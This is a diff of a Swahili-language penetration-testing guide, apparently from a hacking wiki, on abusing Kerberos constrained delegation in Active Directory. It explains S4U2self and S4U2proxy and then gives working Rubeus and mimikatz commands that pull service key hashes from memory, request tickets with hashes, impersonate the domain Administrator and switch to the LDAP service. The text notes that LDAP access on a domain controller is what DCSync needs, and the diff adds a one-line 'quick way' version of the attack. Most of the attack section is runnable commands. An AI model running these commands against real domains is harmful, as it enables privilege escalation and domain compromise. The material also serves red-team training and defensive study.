@@ -4,16 +4,16 @@
 
 ## Constrained Delegation
 
-Kwa kutumia hii, msimamizi wa Domain anaweza **kuruhusu** kompyuta **kujifanya** kama mtumiaji au kompyuta dhidi ya **huduma** ya mashine.
+Kwa kutumia hii, msimamizi wa Domain anaweza **kuruhusu** kompyuta **kujifanya** kama mtumiaji au kompyuta dhidi ya **huduma** ya mashine yoyote.
 
-- **Huduma kwa Mtumiaji kujitenga (**_**S4U2self**_**):** Ikiwa **akaunti ya huduma** ina thamani ya _userAccountControl_ inayojumuisha [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), basi inaweza kupata TGS kwa ajili yake mwenyewe (huduma) kwa niaba ya mtumiaji mwingine yeyote.
-- **Huduma kwa Mtumiaji Proxy(**_**S4U2proxy**_**):** **Akaunti ya huduma** inaweza kupata TGS kwa niaba ya mtumiaji yeyote kwa huduma iliyoainishwa katika **msDS-AllowedToDelegateTo.** Ili kufanya hivyo, kwanza inahitaji TGS kutoka kwa mtumiaji huyo kwa ajili yake, lakini inaweza kutumia S4U2self kupata TGS hiyo kabla ya kuomba nyingine.
+- **Huduma kwa Mtumiaji kujitenga (_S4U2self_):** Ikiwa **akaunti ya huduma** ina thamani ya _userAccountControl_ inayojumuisha [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), basi inaweza kupata TGS kwa ajili yake mwenyewe (huduma) kwa niaba ya mtumiaji mwingine yeyote.
+- **Huduma kwa Mtumiaji Proxy(_S4U2proxy_):** **Akaunti ya huduma** inaweza kupata TGS kwa niaba ya mtumiaji yeyote kwa huduma iliyowekwa katika **msDS-AllowedToDelegateTo.** Ili kufanya hivyo, kwanza inahitaji TGS kutoka kwa mtumiaji huyo kwa ajili yake mwenyewe, lakini inaweza kutumia S4U2self kupata TGS hiyo kabla ya kuomba nyingine.
 
 **Kumbuka**: Ikiwa mtumiaji amewekwa alama kama ‘_Akaunti ni nyeti na haiwezi kuhamasishwa_’ katika AD, huwezi **kujifanya** nao.
 
-Hii inamaanisha kwamba ikiwa utachafua hash ya huduma, unaweza **kujifanya kwa watumiaji** na kupata **ufikiaji** kwa niaba yao kwa **huduma iliyowekwa** (inawezekana **privesc**).
+Hii inamaanisha kwamba ikiwa **utavunja hash ya huduma** unaweza **kujifanya kwa watumiaji** na kupata **ufikiaji** kwa niaba yao kwa huduma yoyote juu ya mashine zilizoonyeshwa (inawezekana **privesc**).
 
-Zaidi ya hayo, **hutakuwa na ufikiaji tu kwa huduma ambayo mtumiaji anaweza kujifanya, bali pia kwa huduma yoyote** kwa sababu SPN (jina la huduma iliyohitajika) halijakaguliwa, ni ruhusa pekee. Hivyo, ikiwa una ufikiaji kwa **huduma ya CIFS** unaweza pia kuwa na ufikiaji kwa **huduma ya HOST** ukitumia bendera ya `/altservice` katika Rubeus.
+Zaidi ya hayo, **hutakuwa na ufikiaji tu kwa huduma ambayo mtumiaji anaweza kujifanya, bali pia kwa huduma yoyote** kwa sababu SPN (jina la huduma iliyotakiwa) halijakaguliwa (katika tiketi sehemu hii haijaandikwa/haijasainiwa). Hivyo, ikiwa una ufikiaji kwa **huduma ya CIFS** unaweza pia kuwa na ufikiaji kwa **huduma ya HOST** kwa kutumia bendera ya `/altservice` katika Rubeus kwa mfano.
 
 Pia, **ufikiaji wa huduma ya LDAP kwenye DC**, ndio inahitajika ili kutumia **DCSync**.
 ```bash:Enumerate
@@ -25,6 +25,11 @@ Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowed
 ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
 ```
 
+```bash:Quick Way
+# Generate TGT + TGS impersonating a user knowing the hash
+Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
+```
+- Hatua ya 1: **Pata TGT ya huduma iliyoruhusiwa**
 ```bash:Get TGT
 # The first step is to get a TGT of the service that can impersonate others
 ## If you are SYSTEM in the server, you might take it from memory
@@ -36,22 +41,24 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 mimikatz sekurlsa::ekeys
 
 ## Request with aes
-tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
+tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap
 
 # Request with RC4
-tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
+tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
 > [!WARNING]
 > Kuna **njia nyingine za kupata tiketi ya TGT** au **RC4** au **AES256** bila kuwa SYSTEM kwenye kompyuta kama Printer Bug na unconstrained delegation, NTLM relaying na matumizi mabaya ya Active Directory Certificate Service
 >
 > **Kuwa na tiketi hiyo ya TGT (au iliyohashwa) unaweza kufanya shambulio hili bila kuathiri kompyuta nzima.**
+
+- Step2: **Pata TGS kwa huduma ikijifanya kuwa mtumiaji**
 ```bash:Using Rubeus
-#Obtain a TGS of the Administrator user to self
+# Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
 
-#Obtain service TGS impersonating Administrator (CIFS)
+# Obtain service TGS impersonating Administrator (CIFS)
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS
 
 #Impersonate Administrator on different service (HOST)
